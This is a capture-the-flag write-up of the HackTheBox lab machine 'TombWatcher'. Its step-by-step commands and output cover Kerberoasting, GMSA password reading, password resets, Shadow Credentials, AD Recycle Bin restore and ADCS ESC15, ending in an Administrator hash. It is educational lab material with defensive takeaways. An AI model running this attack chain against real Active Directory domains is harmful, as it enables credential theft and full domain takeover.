TombWatcher¶

TL;DR¶

Phase Technique
Initial Access Provided creds (assume breach)
Henry → Alfred Targeted Kerberoasting (WriteSPN)
Alfred → ANSIBLE_DEV$ AddSelf + GMSA password extraction
ANSIBLE_DEV$ → Sam ForceChangePassword
Sam → John WriteOwner + Shadow Credentials
John → cert_admin AD Recycle Bin restore
cert_admin → Admin ESC15 (CVE-2024-49019)

Box Info¶

Property Value
Name TombWatcher
OS Windows Server 2019
Difficulty Medium (30 points)
IP 10.10.11.72
Domain tombwatcher.htb
Hostname DC01
Initial Creds henry:H3nry_987TGV!

Exegol Setup¶

I used Exegol for this box.

# Add the target
exh add hosts --ip '10.10.11.72' -n tombwatcher.htb -n dc01.tombwatcher.htb -r DC
exh set hosts

# Store initial creds (assume breach scenario)
exh add creds -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
exh set creds

Now we have access to variables like $IP, $DOMAIN, $USER, $PASSWORD throughout the engagement.

Credential Validation¶

nxc smb $IP -u "$USER" -p "$PASSWORD"

SMB  10.10.11.72  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB  10.10.11.72  445  DC01  [+] tombwatcher.htb\henry:H3nry_987TGV!

Creds work for SMB and LDAP, but not for WinRM (user not in Remote Management Users).

Web Enumeration¶

The web server on port 80 shows the default IIS page. Nothing interesting with feroxbuster either - just default content.

SMB Shares¶

nxc smb $IP -u "$USER" -p "$PASSWORD" --shares

Only default shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) - nothing accessible with our current user.

BloodHound Analysis¶

For this box, I used RustHound-CE because it also collects ADCS data (which will be crucial later):

rusthound-ce -d $DOMAIN -u "$USER" -p "$PASSWORD" -i $IP --adcs --zip

Import the zip into BloodHound CE and analyze the attack paths.

Key findings: - Only 4 non-default domain users: henry, alfred, sam, john - 11 certificate templates enabled - Long privilege escalation chain from henry to Administrator

The attack path is quite long but clear: 1. henry → WriteSPN → alfred 2. alfred → AddSelf → Infrastructure group → ReadGMSAPassword → ANSIBLE_DEV$ 3. ANSIBLE_DEV$ → ForceChangePassword → sam 4. sam → WriteOwner → john 5. john → GenericAll on ADCS OU → recover cert_admin from Recycle Bin 6. cert_admin → ESC15 → Administrator

Let's go step by step.

Henry → Alfred (Targeted Kerberoasting)¶

BloodHound shows that henry has WriteSPN permission over alfred. This is perfect for a targeted Kerberoasting attack!

The idea: 1. Add an SPN (Service Principal Name) to alfred's account 2. Request a TGS ticket for that SPN 3. The ticket is encrypted with alfred's password hash 4. Crack it offline

Adding the SPN¶

bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN set object alfred servicePrincipalName -v 'HTTP/pwned.tombwatcher.htb'

[+] alfred's servicePrincipalName has been updated

Kerberoasting¶

nxc ldap $IP -u "$USER" -p "$PASSWORD" --kerberoast kerberoast.txt

LDAP  10.10.11.72  389  DC01  $krb5tgs$23$*alfred$TOMBWATCHER.HTB$tombwatcher.htb/alfred*$a1b2c3...

Cracking the Hash¶

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*alfred$...:basketball

Weak password! Now we have alfred:basketball.

exh add creds -d $DOMAIN -u alfred -p 'basketball'
exh set creds

Alfred → ANSIBLE_DEV$ (GMSA Password)¶

Looking at BloodHound, alfred has AddSelf rights over the Infrastructure group. And that group can ReadGMSAPassword on ANSIBLE_DEV$ (a Group Managed Service Account).

Adding Alfred to Infrastructure¶

bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN add groupMember "Infrastructure" "$USER"

[+] alfred added to Infrastructure

Reading the GMSA Password¶

nxc ldap $IP -u "$USER" -p "$PASSWORD" --gmsa

LDAP  10.10.11.72  389  DC01  [*] Getting GMSA Passwords
LDAP  10.10.11.72  389  DC01  Account: ANSIBLE_DEV$  NTLM: 1c37d00093dc2a5f25176bf2d474afdc

We got the NTLM hash for the GMSA account.

exh add creds -d $DOMAIN -u 'ANSIBLE_DEV$' -H '1c37d00093dc2a5f25176bf2d474afdc'
exh set creds

ANSIBLE_DEV$ → Sam (ForceChangePassword)¶

The GMSA account ANSIBLE_DEV$ has ForceChangePassword permission over sam. We can reset his password without knowing the current one.

bloodyAD -u "$USER" -H "$HASH" --host $IP -d $DOMAIN set password sam 'Password123!'

[+] Password changed successfully!

exh add creds -d $DOMAIN -u sam -p 'Password123!'
exh set creds

# Verify
nxc smb $IP -u "$USER" -p "$PASSWORD"

SMB  10.10.11.72  445  DC01  [+] tombwatcher.htb\sam:Password123!

Sam → John (Shadow Credentials)¶

Now comes a nice chain. sam has WriteOwner over john. The attack path: 1. Take ownership of john's object 2. Grant ourselves GenericAll 3. Perform a Shadow Credentials attack

Taking Ownership and Granting GenericAll¶

# Take ownership
bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN set owner john "$USER"

# Grant GenericAll
bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN add genericAll john "$USER"

Shadow Credentials Attack¶

Shadow Credentials abuse allows us to add a certificate to john's msDS-KeyCredentialLink attribute, then use that certificate to authenticate as john.

certipy shadow auto -u "$USER@$DOMAIN" -p "$PASSWORD" -account john -dc-ip $IP

[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'

[*] Successfully added Key Credential

We got john's NTLM hash!

exh add creds -d $DOMAIN -u john -H 'ad9324754583e3e42b55aad4d3b8d2bf'
exh set creds

Getting a Shell¶

evil-winrm -i $IP -u "$USER" -H "$HASH"

User flag!

John → cert_admin (AD Recycle Bin)¶

This part is really cool. john has GenericAll over the ADCS OU (Organizational Unit containing certificate services objects).

While enumerating, I noticed there are deleted accounts in the AD Recycle Bin. Let's check:

*Evil-WinRM* PS C:\> Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*cert*"' -IncludeDeletedObjects -Properties *

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
primaryGroupID    : 513
sAMAccountName    : cert_admin

There's a deleted user cert_admin! The name suggests this account has certificate-related privileges. Let's restore it.

Restoring the Account¶

*Evil-WinRM* PS C:\> Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"

Account restored! Now we need to set a password (since we have GenericAll on the OU):

bloodyAD -u "$USER" -H "$HASH" --host $IP -d $DOMAIN set password cert_admin 'Password123!'

exh add creds -d $DOMAIN -u cert_admin -p 'Password123!'
exh set creds

cert_admin → Administrator (ESC15)¶

Now for the final boss: ESC15 (CVE-2024-49019). This is a relatively new ADCS vulnerability from late 2024.

Enumerating Vulnerable Templates¶

certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip $IP -vulnerable

The WebServer template is vulnerable: - Schema Version 1 (no Application Policies enforcement) - Enrollee supplies subject - We can set our own Application Policies

The Attack¶

ESC15 works like this: 1. Request a certificate with the "Certificate Request Agent" Application Policy 2. Use that certificate to request another certificate on behalf of Administrator 3. Authenticate as Administrator

Step 1: Get Certificate Request Agent Certificate¶

certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip $IP \
  -ca tombwatcher-CA-1 -template WebServer \
  -application-policies "Certificate Request Agent"

[*] Requesting certificate
[*] Successfully requested certificate
[*] Saved certificate and private key to 'cert_admin.pfx'

Step 2: Request Administrator Certificate¶

certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip $IP \
  -ca tombwatcher-CA-1 -template User \
  -on-behalf-of "$DOMAIN\\Administrator" \
  -pfx cert_admin.pfx

[*] Requesting certificate on behalf of 'tombwatcher\Administrator'
[*] Successfully requested certificate
[*] Saved certificate and private key to 'administrator.pfx'

Step 3: Authenticate as Administrator¶

certipy auth -pfx administrator.pfx -dc-ip $IP

[*] Using principal: administrator@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc

Getting Root Shell¶

evil-winrm -i $IP -u Administrator -H 'f61db423bebe3328d33af26741afe5fc'

Root flag!

Summary¶

Step From To Technique
1 henry alfred Targeted Kerberoasting (WriteSPN)
2 alfred ANSIBLE_DEV$ AddSelf + GMSA password read
3 ANSIBLE_DEV$ sam ForceChangePassword
4 sam john WriteOwner + Shadow Credentials
5 john cert_admin AD Recycle Bin restore
6 cert_admin Administrator ESC15 (CVE-2024-49019)

This box is a masterclass in AD privilege escalation. The long chain through various permissions (WriteSPN, AddSelf, ForceChangePassword, WriteOwner, GenericAll) combined with the AD Recycle Bin trick and ESC15 at the end makes it really educational.

Key takeaways: - Always check for WriteSPN permissions (targeted Kerberoasting) - GMSA passwords can be read if you're in the right group - AD Recycle Bin can contain valuable deleted accounts - Keep your ADCS patched against ESC vulnerabilities!
